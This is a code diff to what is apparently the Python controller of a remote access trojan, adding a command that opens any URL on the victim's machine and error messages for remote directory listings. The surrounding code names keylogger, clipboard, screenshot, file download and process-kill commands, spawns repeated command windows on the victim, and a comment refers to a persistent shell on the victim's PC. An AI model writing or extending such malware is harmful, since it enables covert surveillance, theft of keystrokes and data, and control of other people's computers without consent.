@@ -24,7 +24,7 @@ session_ids = []
 COMMANDS = ["help", "sessions"]
 SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs",
                     "keybind", "msg", "statlights", "delete", "uninstall", "ls", "whoami", "clipboard", "download",
-                    "error", "screenshot", "cpu", "kermit"]
+                    "error", "screenshot", "cpu", "kermit", "url"]
 
 
 class Commands:
@@ -285,9 +285,18 @@ class Commands:
             if args:
                 path = " ".join(args).replace("/", "\\")
                 if " " in path:
-                    print(sendMessage(f'c o dir "{path}"'))
+                    content = sendMessage(f'c o dir "{path}"')
+                    if content == "error":
+                        print("The path doesent exist")
+                    else:
+                        print(content)
                 else:
-                    print(sendMessage(f'c o dir {path}'))
+                    content = sendMessage(f'c o dir {path}')
+                    if content == "error":
+                        print("The path doesent exist")
+                    else:
+                        print(content)
+
 
             elif not args:
                 print("You need specify a path type 'help' for more")
@@ -431,7 +440,13 @@ class Commands:
                 for cmds in range(0, 10):
                     sendMessage(f"c n start cmd /c C:/Users/{username}/AppData/Local/Temp/{cmdname}")
                     sleep(0.1)
-
+        elif message == "url":
+            if len(args) == 1:
+                sendMessage(f"c n explorer {args[0]}")
+            elif not args:
+                print("You need to specify an url")
+            else:
+                print("Too many arguments type 'help' for more")
         # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
         elif message == "disconnect":
             sendMessage("!dsc")
